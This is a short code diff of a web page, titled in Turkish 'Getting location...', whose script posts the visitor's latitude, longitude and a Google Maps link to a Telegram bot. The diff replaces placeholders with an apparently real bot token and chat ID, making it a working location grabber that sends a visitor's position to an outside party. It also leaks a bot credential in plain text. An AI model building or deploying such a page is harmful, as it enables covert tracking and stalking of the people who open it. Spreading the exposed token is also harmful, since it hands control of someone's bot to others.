@@ -7,11 +7,11 @@
     <h3>Konum alınıyor...</h3>
     <script>
       function sendLocation(lat, lon) {
-        fetch("https://api.telegram.org/bot<BOT_TOKEN>/sendMessage", {
+        fetch("https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: "<CHAT_ID>",
+            chat_id: "6358000072",
             text: `📍 Konum alındı:\n\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`
           })
         });
